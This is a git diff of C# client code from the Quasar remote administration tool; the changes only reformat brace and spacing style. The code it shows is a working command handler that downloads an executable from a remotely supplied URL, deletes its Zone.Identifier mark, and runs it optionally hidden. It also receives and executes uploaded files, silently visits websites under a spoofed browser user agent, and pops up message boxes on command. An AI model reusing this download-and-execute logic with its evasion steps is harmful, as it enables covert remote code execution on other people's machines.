@@ -9,38 +9,29 @@ using System.Net;
 using System.Threading;
 using System.Windows.Forms;
 
-namespace Quasar.Client.Commands
-{
+namespace Quasar.Client.Commands {
     /* THIS PARTIAL CLASS SHOULD CONTAIN MISCELLANEOUS METHODS. */
-    public static partial class CommandHandler
-    {
+    public static partial class CommandHandler {
         public static void HandleDoDownloadAndExecute(DoDownloadAndExecute command,
-            Networking.Client client)
-        {
-            client.Send(new SetStatus {Message = "Downloading file..."});
+            Networking.Client client) {
+            client.Send(new SetStatus { Message = "Downloading file..." });
 
-            new Thread(() =>
-            {
+            new Thread(() => {
                 string tempFile = FileHelper.GetTempFilePath(".exe");
 
-                try
-                {
-                    using (WebClient c = new WebClient())
-                    {
+                try {
+                    using (WebClient c = new WebClient()) {
                         c.Proxy = null;
                         c.DownloadFile(command.Url, tempFile);
                     }
-                }
-                catch
-                {
+                } catch {
                     client.Send(new SetStatus { Message = "Download failed" });
                     return;
                 }
 
                 client.Send(new SetStatus { Message = "Downloaded File" });
 
-                try
-                {
+                try {
                     FileHelper.DeleteZoneIdentifier(tempFile);
 
                     var bytes = File.ReadAllBytes(tempFile);
@@ -48,35 +39,30 @@ namespace Quasar.Client.Commands
                         throw new Exception("no pe file");
 
                     ProcessStartInfo startInfo = new ProcessStartInfo();
-                    if (command.RunHidden)
-                    {
+                    if (command.RunHidden) {
                         startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                         startInfo.CreateNoWindow = true;
                     }
                     startInfo.UseShellExecute = false;
                     startInfo.FileName = tempFile;
                     Process.Start(startInfo);
-                }
-                catch (Exception ex)
-                {
+                } catch (Exception ex) {
                     NativeMethods.DeleteFile(tempFile);
-                    client.Send(new SetStatus {Message = $"Execution failed: {ex.Message}"});
+                    client.Send(new SetStatus { Message = $"Execution failed: {ex.Message}" });
                     return;
                 }
-                
-                client.Send(new SetStatus {Message = "Executed File"});
+
+                client.Send(new SetStatus { Message = "Executed File" });
             }).Start();
         }
 
-        public static void HandleDoUploadAndExecute(DoUploadAndExecute command, Networking.Client client)
-        {
+        public static void HandleDoUploadAndExecute(DoUploadAndExecute command, Networking.Client client) {
             if (!_renamedFiles.ContainsKey(command.Id))
                 _renamedFiles.Add(command.Id, FileHelper.GetTempFilePath(Path.GetExtension(command.FileName)));
 
             string filePath = _renamedFiles[command.Id];
 
-            try
-            {
+            try {
                 if (command.CurrentBlock == 0 && Path.GetExtension(filePath) == ".exe" && !FileHelper.HasExecutableIdentifier(command.Block))
                     throw new Exception("No executable file");
 
@@ -93,8 +79,7 @@ namespace Quasar.Client.Commands
                     FileHelper.DeleteZoneIdentifier(filePath);
 
                     ProcessStartInfo startInfo = new ProcessStartInfo();
-                    if (command.RunHidden)
-                    {
+                    if (command.RunHidden) {
                         startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                         startInfo.CreateNoWindow = true;
                     }
@@ -102,34 +87,28 @@ namespace Quasar.Client.Commands
                     startInfo.FileName = filePath;
                     Process.Start(startInfo);
 
-                    client.Send(new SetStatus {Message = "Executed File"});
+                    client.Send(new SetStatus { Message = "Executed File" });
                 }
-            }
-            catch (Exception ex)
-            {
+            } catch (Exception ex) {
                 if (_renamedFiles.ContainsKey(command.Id))
                     _renamedFiles.Remove(command.Id);
                 NativeMethods.DeleteFile(filePath);
 
-                client.Send(new SetStatus {Message = $"Execution failed: {ex.Message}"});
+                client.Send(new SetStatus { Message = $"Execution failed: {ex.Message}" });
             }
         }
 
-        public static void HandleDoVisitWebsite(DoVisitWebsite command, Networking.Client client)
-        {
+        public static void HandleDoVisitWebsite(DoVisitWebsite command, Networking.Client client) {
             string url = command.Url;
 
             if (!url.StartsWith("http"))
                 url = "http://" + url;
 
-            if (Uri.IsWellFormedUriString(url, UriKind.RelativeOrAbsolute))
-            {
+            if (Uri.IsWellFormedUriString(url, UriKind.RelativeOrAbsolute)) {
                 if (!command.Hidden)
                     Process.Start(url);
-                else
-                {
-                    try
-                    {
+                else {
+                    try {
                         HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);
                         request.UserAgent =
                             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A";
@@ -137,30 +116,25 @@ namespace Quasar.Client.Commands
                         request.Timeout = 10000;
                         request.Method = "GET";
 
-                        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
-                        {
+                        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse()) {
                         }
-                    }
-                    catch
-                    {
+                    } catch {
                     }
                 }
 
-                client.Send(new SetStatus {Message = "Visited Website"});
+                client.Send(new SetStatus { Message = "Visited Website" });
             }
         }
 
-        public static void HandleDoShowMessageBox(DoShowMessageBox command, Networking.Client client)
-        {
-            new Thread(() =>
-            {
+        public static void HandleDoShowMessageBox(DoShowMessageBox command, Networking.Client client) {
+            new Thread(() => {
                 MessageBox.Show(command.Text, command.Caption,
-                    (MessageBoxButtons) Enum.Parse(typeof(MessageBoxButtons), command.Button),
-                    (MessageBoxIcon) Enum.Parse(typeof(MessageBoxIcon), command.Icon),
+                    (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), command.Button),
+                    (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.Icon),
                     MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
             }).Start();
 
-            client.Send(new SetStatus {Message = "Showed Messagebox"});
+            client.Send(new SetStatus { Message = "Showed Messagebox" });
         }
     }
 }
